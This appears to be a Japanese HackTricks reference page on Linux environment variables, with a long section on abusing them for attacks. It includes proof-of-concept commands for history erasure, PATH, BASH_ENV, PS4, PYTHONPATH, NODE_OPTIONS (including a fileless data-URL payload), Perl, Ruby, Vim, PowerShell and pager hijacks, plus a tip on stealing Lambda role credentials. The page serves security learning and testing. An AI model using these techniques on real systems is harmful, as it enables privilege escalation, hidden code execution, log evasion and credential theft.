# Linux環境変数

{{#include ../../banners/hacktricks-training.md}}

## グローバル変数

グローバル変数は**子プロセス**に継承されます。

現在のセッション用にグローバル変数を作成するには、次のようにします。
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
この変数は、現在のセッションとその子プロセスからアクセスできます。

変数を**削除**するには、次を実行します:
```bash
unset MYGLOBAL
```
## ローカル変数

**ローカル変数**は、**現在のシェル/スクリプト**からのみ**アクセス**できます。
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## 現在の変数を一覧表示
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` の内容は **NUL区切り** なので、これらのバリアントのほうが通常は読みやすくなります:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
**credentials**や**interesting service configuration**を継承された環境内で探している場合は、[Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md)も確認してください。

## Common variables

From: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – **X**で使用されるディスプレイ。この変数は通常**:0.0**に設定され、現在のコンピューターの最初のディスプレイを意味します。
- **EDITOR** – ユーザーが優先するテキストエディター。
- **HISTFILESIZE** – history fileに含められる行数の最大値。
- **HISTSIZE** – ユーザーがセッションを終了したときにhistory fileへ追加される行数。
- **HOME** – ホームディレクトリ。
- **HOSTNAME** – コンピューターのhostname。
- **LANG** – 現在の言語。
- **MAIL** – ユーザーのmail spoolの場所。通常は**/var/spool/mail/USER**。
- **MANPATH** – manual pagesを検索するディレクトリの一覧。
- **OSTYPE** – operating systemの種類。
- **PS1** – bashのデフォルトプロンプト。
- **PATH** – 相対パスや絶対パスを指定せず、ファイル名を指定するだけで実行したいbinary filesを格納しているすべてのディレクトリのパスを保持します。
- **PWD** – 現在のworking directory。
- **SHELL** – 現在のcommand shellへのパス（例：**/bin/bash**）。
- **TERM** – 現在のterminal type（例：**xterm**）。
- **TZ** – タイムゾーン。
- **USER** – 現在のusername。

## Interesting variables for hacking

すべての変数が同じように有用なわけではありません。offensiveな観点では、**search paths**、**startup files**、**dynamic linker behavior**、または**audit/logging**を変更する変数を優先します。

### **HISTFILESIZE**

**この変数の値を0に変更**すると、**セッションを終了**したときに**history file**（\~/.bash_history）が**0行にtruncateされます**。
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

この変数の**値を0に変更**すると、コマンドが**メモリ内の履歴に保持されなくなり**、**履歴ファイル**（\~/.bash_history）にも書き戻されません。
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

**この変数の値が `ignorespace` または `ignoreboth` に設定されている場合**、先頭に余分なスペースを付けたコマンドは履歴に保存されません。
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**history file** を **`/dev/null`** に指定するか、完全に unset します。これは、history size だけを変更するよりも、通常は信頼性が高くなります。
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

プロセスは、http または https を介してインターネットに接続するため、ここで宣言された **proxy** を使用します。
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy と no_proxy

- `all_proxy`: これを利用するツールやプロトコルのデフォルトプロキシ。
- `no_proxy`: 直接接続するホスト/ドメイン/CIDR のバイパスリスト。
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
ツールに応じて、小文字と大文字の両方の形式が使用される場合があります（`http_proxy`/`HTTP_PROXY`、`no_proxy`/`NO_PROXY`）。

### SSL_CERT_FILE & SSL_CERT_DIR

プロセスは、**これらの環境変数**で指定された証明書を信頼します。これは、**`curl`**、**`git`**、Python HTTP クライアント、またはパッケージマネージャーなどのツールに、攻撃者が管理する CA を信頼させるのに役立ちます（例えば、interception proxy を正規のものに見せかけるため）。
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

特権ラッパー/スクリプトが**絶対パスなしで**コマンドを実行する場合、`PATH` 内で最初にある攻撃者制御のディレクトリが優先されます。これは、`sudo`、cron ジョブ、シェルラッパー、カスタム SUID ヘルパーにおける多くの **PATH hijack** の基盤となる primitive です。`env_keep+=PATH`、脆弱な `secure_path`、または `tar`、`service`、`cp`、`python` などを名前だけで呼び出すラッパーを探してください。
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
`PATH`を悪用した完全なprivilege-escalation chainについては、[Linux Privilege Escalation](linux-privilege-escalation/README.md)を確認してください。

### **HOME & XDG_CONFIG_HOME**

`HOME`は単なるディレクトリ参照ではありません。多くのツールは、`$HOME`または`$XDG_CONFIG_HOME`から**dotfiles**、**plugins**、**per-user configuration**を自動的に読み込みます。privileged workflowがこれらの値を保持する場合、**config injection**はbinary hijackingよりも容易になる可能性があります。
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
興味深い対象には、`.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`、および `.terraformrc` のようなツール固有のファイルがあります。

### **LD_PRELOAD、LD_LIBRARY_PATH、LD_AUDIT**

これらの変数は **dynamic linker** に影響を与えます。

- `LD_PRELOAD`: 追加の shared object を最初にロードするよう強制します。
- `LD_LIBRARY_PATH`: library の検索ディレクトリを先頭に追加します。
- `LD_AUDIT`: library のロードと symbol resolution を監視する auditor library をロードします。

特権コマンドがこれらを保持する場合、**hooking**、**instrumentation**、および **privilege escalation** に非常に有用です。**secure-execution** モード（`AT_SECURE`、setuid/setgid/capabilities など）では、loader がこれらの変数の多くを削除または制限します。ただし、この初期の loader stage に存在する parser bug は、対象プログラムより**前に**実行されるため、依然として影響が大きくなります。<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` は glibc の初期動作（allocator tunables など）を変更するため、exploit lab で非常に便利です。また、**dynamic loader が非常に早い段階で解析する**ため、security の観点でも重要です。2023 年の **Looney Tunables** bug は、loader で解析される単一の environment variable が、SUID プログラムに対する **local privilege-escalation primitive** になり得ることを改めて示しました。<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

**Bash** が **non-interactively** 起動されると、対象の script を実行する前に `BASH_ENV` を確認し、そのファイルを source します。Bash が `sh` として呼び出された場合、または POSIX-style の interactive mode では、`ENV` も参照されることがあります。これは、環境変数を攻撃者が制御できる場合に、shell wrapper を code execution に変える古典的な方法です。
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bashは**real/effective IDsが異なる**場合、これらのstartup filesを無視します。`-p`はeffective IDを保持しますが、これらのstartup filesを有効にはしないため、正確な挙動はwrapperがshellをどのように起動するかによって異なります。`setuid()`/`setgid()`を**Bashの起動前**に呼び出すprivileged wrapperには注意してください。IDsが再び一致すると、Bashは通常なら無視する`BASH_ENV`、`ENV`、および関連するshell stateを信頼する可能性があります。<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bashが**xtrace**を有効にして実行されると、すべてのtrace対象コマンドの前に`PS4`を展開して表示します。`PS4`はpromptと同様に展開されるため、その中の**command substitution**が実行されます。重要なのは、xtrace自体を環境変数から`SHELLOPTS=xtrace`をexportするだけで有効にできる点です。コマンドラインに`-x`は必要ありません。そのため、victimが実行する任意のBash scriptがcode executionになります。<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` は xtrace が有効になるまで何もしません（`SHELLOPTS=xtrace`、`set -x`、または `bash -x`）。また、Bash は `BASH_ENV` と同様に、privileged/setuid コンテキストでは `SHELLOPTS` を削除します。

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

これらの変数は、Python の起動方法を変更します。

- `PYTHONPATH`: import の検索パスを先頭に追加します。
- `PYTHONHOME`: standard library のツリーを移動します。
- `PYTHONSTARTUP`: interactive prompt の前にファイルを実行します。
- `PYTHONINSPECT=1`: script の終了後に interactive mode に移行します。
- `PYTHONBREAKPOINT`: コードが `breakpoint()` に到達したときに呼び出される `package.module.callable`（およびその module）を指定します。<sup>[[8]](#references)</sup>

これらは、制御可能な環境で Python を呼び出す maintenance script、debugger、shell、wrapper に対して有用です。`python -E` と `python -I` は、すべての `PYTHON*` 変数を無視します。
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
最近の実例として、Ubuntu/Debian systems における 2024 年の **needrestart** LPE がありました。root-owned scanner が `/proc/<PID>/environ` から unprivileged process の `PYTHONPATH` をコピーし、その後 Python を実行していました。公開された exploit では、attacker-controlled path に `importlib/__init__.so` を配置することで、helper の hard-coded script が問題になる前に、Python 自身の初期化中に attacker code を実行させていました。<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl にも同様に有用な startup variables があります。

- `PERL5LIB`: library directories を prepend する。
- `PERL5OPT`: すべての `perl` command line に指定されているかのように switches を inject する。

これにより、target script が何か興味深い処理を行う前に、**automatic module loading** を強制したり、interpreter の動作を変更したりできます。Perl は **taint / setuid / setgid** contexts ではこれらの variables を無視しますが、通常の root-run wrappers、CI jobs、installers、custom sudoers rules では依然として非常に重要です。
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` は、環境を継承するすべての `node` プロセスに **Node.js CLI flags** を先頭追加します。これにより、最終的に Node を呼び出す wrappers、CI jobs、Electron helpers、sudo rules に対して有効です。攻撃で特に興味深い flags は、通常次のとおりです。

- `--require <file>`: target script の前に CommonJS file を preload します。
- `--import <module>`: target script の前に ES module を preload します。

Node は `NODE_OPTIONS` 内の一部の危険な flags を拒否しますが、`--require` と `--import` は明示的に許可されており、通常の command-line arguments より **前に** 処理されます。<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### `data:` URLを使用したFileless preload

Target上で`NODE_OPTIONS`を設定できるものの、ファイルを書き込めない場合（read-only filesystem、restricted API、serverless runtimeなど）、`--import`は`data:text/javascript,` URLを受け付けるため、payload全体を環境変数自体に含められます。JavaScriptは**完全にURLエンコード**する必要があります。Nodeは値をURLとして解析するため、raw space（またはその他の未エンコード文字）があるとpayloadが途中で切り詰められ、`SyntaxError`が発生します。これは、`--import`が`NODE_OPTIONS`のallowlistに含まれるNode 20.6以降で動作します。<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> これは、関数が Node を実行する **managed cloud runtimes** において、`NODE_OPTIONS` の制御を RCE に変える一般的な方法です。例えば、攻撃者が Lambda の設定のみを変更できる場合（`iam:PassRole` もコード更新権限もない場合）、`NODE_OPTIONS=--import data:text/javascript,<payload>` を注入して関数内でコードを実行し、その実行ロールの認証情報を窃取できます。注入された module は handler より**前に**実行され、その後 handler は通常どおり実行されます。

`NODE_OPTIONS` を間接的に設定する remote gadget chains（例えば、prototype-pollution から RCE につなげるもの）については、[こちらのページ](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)を確認してください。

### **RUBYLIB & RUBYOPT**

Ruby でも、同じ種類の startup abuse が可能です。

- `RUBYLIB`: Ruby の load path の先頭にディレクトリを追加します。
- `RUBYOPT`: すべての `ruby` invocation に `-r` などの command-line options を注入します。
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024年の **needrestart** の脆弱性は、これが単なるラボ上のテクニックではないことを示しました。`PYTHONPATH` abuse に対して脆弱だった同じ root-owned helper は、攻撃者が制御する `RUBYLIB` を使って Ruby を実行し、攻撃者のディレクトリから `enc/encdb.so` を読み込むよう強制することも可能でした。<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim は通常の起動時に、`VIMINIT`（またはその `EXINIT` fallback）に含まれる Ex commands を実行します。Ex commands には `:!cmd` や `:call system(...)` が含まれるため、被害者が Vim（root の `sudo vim`、`crontab -e`、`visudo`、`git`/`less` による `$EDITOR` の起動など）を開くと、変数を制御することで code execution が可能になります。<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Batch mode（`vim -es`/`-Es`）ではこれらの変数はスキップされますが、通常の interactive startup では実行されます。

### **PowerShell (pwsh): PSModulePath、DOTNET_STARTUP_HOOKS、CLR profiler**

PowerShell Core（`pwsh`）は Linux/macOS（および Windows）上で動作し、**.NET application** です。そのため、複数の environment variables によって、継承された環境でのあらゆる `pwsh` invocation を code execution に変えられます。これは cron/systemd jobs、CI runners、`pwsh` を shell out する privileged wrappers に対して有用です。

- `PSModulePath`: PowerShell はこのリスト内のすべての directory を再帰的に検索し、export されている command が初めて参照された時点で `.psd1`/`.psm1` modules のいずれかを **auto-load** します。directory を先頭に追加すると、module の top-level code が import 時に実行されます。また、resolution は *Alias → Function → Cmdlet* の順で行われるため、export された function によって、victim が呼び出す built-in cmdlet さえ shadow できます。<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: 起動時に実行される `powershell/Microsoft.PowerShell_profile.ps1` の場所を変更します（`-NoProfile` の場合を除く）。
- `DOTNET_STARTUP_HOOKS`: `Main` より前に `StartupHook.Initialize()` が実行される managed assembly です（すべての .NET app で共有されます）。
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API は起動時に attacker library を process にロードします（path vars は registry より優先されます。`DOTNET_*` は新しい alias です）。Windows PowerShell 5.1（.NET Framework）では `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` を使用します。MITRE ATT&CK T1574.012。<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Windowsでは、`PSExecutionPolicyPreference=Bypass`により、「unsigned scripts blocked」というガードレールも解除されるため、仕込まれたprofile/moduleが実際に実行されます。完全なPoCについては、専用ページを参照してください。

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

一部のツールは、環境変数からpathを読み取るだけではなく、その値を**shell**、**editor**、または**input preprocessor**に渡します。そのため、特権wrapperが`git`、`man`、`less`、または類似のtext viewerを実行する場合、以下の変数は特に注目すべき対象です。

- `PAGER`、`MANPAGER`、`GIT_PAGER`: pager commandを選択します。
- `GIT_EDITOR`、`VISUAL`、`EDITOR`: editor commandを選択します。引数を伴うこともよくあります。
- `LESSOPEN`、`LESSCLOSE`: `less`がファイルを開く際に実行されるpre/post-processorを定義します。
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Gitは、`GIT_CONFIG_COUNT`、`GIT_CONFIG_KEY_<n>`、`GIT_CONFIG_VALUE_<n>`を使用して、ディスクに触れずに**env-only config injection**もサポートします：
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
ポストエクスプロイテーションの観点では、継承された環境に **credentials**、**proxy settings**、**service tokens**、または **cloud keys** が含まれていることも忘れないでください。[Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) で `/proc/<PID>/environ` と `systemd` の `Environment=` hunting を確認してください。

### PS1

プロンプトの表示方法を変更します。

[**これは一例です**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

ルート:

![PERL5OPT & PERL5LIB - PS1: これは一例です](<../images/image (897).png>)

通常のユーザー:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中のジョブが1つ、2つ、3つ](<../images/image (740).png>)

バックグラウンドで実行中のジョブが1つ、2つ、3つ:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中のジョブが1つ、2つ、3つ](<../images/image (145).png>)

バックグラウンドジョブが1つ、停止中のジョブが1つあり、最後のコマンドが正常に完了しなかった場合:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドジョブが1つ、停止中のジョブが1つあり、最後のコマンドが正常に完了しなかった場合](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart における LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [一般的な環境変数 - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc の ld.so における Local Privilege Escalation - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Bash Variables (`PS4`) & The Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Built-in breakpoint() and PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim documentation - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath & PowerShell module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET debugging & profiling config settings (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
